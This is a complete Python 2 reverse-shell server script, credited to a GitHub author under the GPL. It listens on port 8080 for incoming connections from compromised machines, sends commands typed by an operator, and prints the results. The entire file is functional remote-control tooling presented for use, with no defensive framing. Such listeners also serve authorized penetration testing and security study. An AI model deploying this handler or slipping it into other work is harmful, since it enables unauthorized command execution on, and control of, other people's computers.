#!/usr/bin/env python
#
# Python Reverse Shell - Server
# from https://github.com/MisterDaneel/
#
# Copyright (C) {2016}  {MisterDaneel}
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
import socket
import time

host = '0.0.0.0'
port = 8080
BUFF_SIZE = 4096

def NewSocket():
    try:
        s = socket.socket()
    except socket.error as msg:
        print "[*] Socket error: " + str(msg)
    try:
        s.bind((host, port))
        s.listen(5)
        return s
    except socket.error as msg:
        print "[*] Socket binding error: " + str(msg)

def AcceptConnection(s):
    while True:
        if s:
            print "[*] Listening on [" + host + "] (port " + str(port) + ")."
            conn, addr = s.accept()
            print "[*] Connection from [" + addr[0] + "] port " + str(port) + " [tcp/*] accepted (sport " + str(addr[1]) + ")."
            SndCmds(conn, "%s:%s" % (addr[0], addr[1]))
        else:
            break

def SndCmds(conn, addr):
    try:
        title = conn.recv(BUFF_SIZE)

        while True:

            buffer = raw_input("%s@%s> " % (addr, title))
            buffer += '\n'
            conn.send(buffer)

            time.sleep(.2)

            # wait for data
            response = ''
            while True:
                data = conn.recv(BUFF_SIZE)
                response += data
                if len(data) < BUFF_SIZE:
                    break

            if response and len(response.split('\n')) > 1:
                title = response[response.rfind('\n')+1:]
                print response[response.find('\n')+1:response.rfind('\n')]

    except:
        print '[*] Exception. Exiting.'
        conn.close()

if __name__ == "__main__":
    AcceptConnection(NewSocket())
